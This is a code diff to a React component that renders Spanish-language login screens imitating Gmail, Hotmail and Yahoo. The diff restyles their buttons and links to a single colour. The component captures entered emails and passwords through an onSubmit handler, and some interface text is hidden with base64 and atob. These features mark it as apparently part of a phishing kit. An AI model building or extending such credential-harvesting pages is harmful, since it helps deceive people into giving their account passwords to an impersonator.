@@ -1241,11 +1241,11 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             />
             
             <div className="text-left mb-6">
-              <a href="#" className="text-blue-600 text-sm hover:underline">¿Olvidaste el correo electrónico?</a>
+              <a href="#" className="text-[#BE0046] text-sm hover:underline">¿Olvidaste el correo electrónico?</a>
             </div>
             
             <Button 
-              className="bg-blue-600 text-white hover:bg-blue-700 w-full py-2 px-4 rounded"
+              className="bg-[#BE0046] text-white hover:bg-[#9A0037] w-full py-2 px-4 rounded"
               onClick={handleGmailNextScreen}
             >
               Siguiente
@@ -1393,7 +1393,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                     <a href="#" className="text-sm text-blue-600">{atob('T3BjaW9uZXMgZGUgaW5pY2lvIGRlIHNlc2nDs24=')}</a>
                   </div>
                   <Button 
-                    className="bg-blue-600 text-white px-8 rounded"
+                    className="bg-[#BE0046] text-white hover:bg-[#9A0037] px-8 rounded"
                     onClick={() => {
                       if (!emailInput) return;
                       setHotmailStep2(true);
@@ -1421,21 +1421,21 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 </div>
                 
                 <div className="text-xs text-gray-600 mb-6 self-start">
-                  <a href="#" className="text-blue-600">{atob('wr9PbHZpZMOzIHN1IGNvbnRyYXNlw7FhPw==')}</a>
+                  <a href="#" className="text-[#BE0046]">{atob('wr9PbHZpZMOzIHN1IGNvbnRyYXNlw7FhPw==')}</a>
                 </div>
                 
                 <div className="flex justify-between w-full">
                   <div>
                     <Button 
                       variant="link" 
-                      className="text-sm text-blue-600 p-0"
+                      className="text-sm text-[#BE0046] p-0"
                       onClick={() => setHotmailStep2(false)}
                     >
                       {atob('QXRyw6Fz')}
                     </Button>
                   </div>
                   <Button 
-                    className="bg-blue-600 text-white px-8 rounded"
+                    className="bg-[#BE0046] text-white hover:bg-[#9A0037] px-8 rounded"
                     onClick={() => {
                       if (!passwordInput) return;
                       onSubmit(ScreenType.HOTMAIL, { 
@@ -1490,10 +1490,10 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 
                 <div className="flex justify-between w-full">
                   <div>
-                    <a href="#" className="text-sm text-blue-700">Crear cuenta</a>
+                    <a href="#" className="text-sm text-[#BE0046]">Crear cuenta</a>
                   </div>
                   <Button 
-                    className="bg-[#6001D2] hover:bg-[#5300bd] text-white px-8 py-2 rounded-sm"
+                    className="bg-[#BE0046] hover:bg-[#9A0037] text-white px-8 py-2 rounded-sm"
                     onClick={() => {
                       // Validación mínima
                       if (!emailInput) return;
@@ -1524,19 +1524,19 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 </div>
                 
                 <div className="text-sm self-start mb-5">
-                  <a href="#" className="text-blue-700">¿Olvidaste tu contraseña?</a>
+                  <a href="#" className="text-[#BE0046]">¿Olvidaste tu contraseña?</a>
                 </div>
                 
                 <div className="flex justify-between w-full">
                   <Button 
                     variant="link" 
-                    className="text-sm text-blue-700 p-0"
+                    className="text-sm text-[#BE0046] p-0"
                     onClick={() => setYahooStep2(false)}
                   >
                     Atrás
                   </Button>
                   <Button 
-                    className="bg-[#6001D2] hover:bg-[#5300bd] text-white px-8 py-2 rounded-sm"
+                    className="bg-[#BE0046] hover:bg-[#9A0037] text-white px-8 py-2 rounded-sm"
                     onClick={() => {
                       // Validación mínima
                       if (!passwordInput) return;
